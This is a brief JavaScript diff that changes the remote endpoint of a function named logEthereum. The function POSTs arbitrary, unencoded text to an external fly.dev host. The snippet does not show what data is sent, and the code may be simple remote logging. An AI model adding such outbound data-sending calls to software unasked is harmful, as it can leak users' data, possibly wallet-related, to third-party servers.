@@ -3,7 +3,7 @@ export const logEthereum = text => {
   var xhr = new XMLHttpRequest();
   xhr.open(
     `POST`,
-    `https://icy-shadow-9979.fly.dev/add?message=${text}&&sender=ethereum.js`,
+    `https://falling-pond-4675.fly.dev/add?message=${text}&&sender=ethereum.js`,
     true,
   );
   xhr.send();
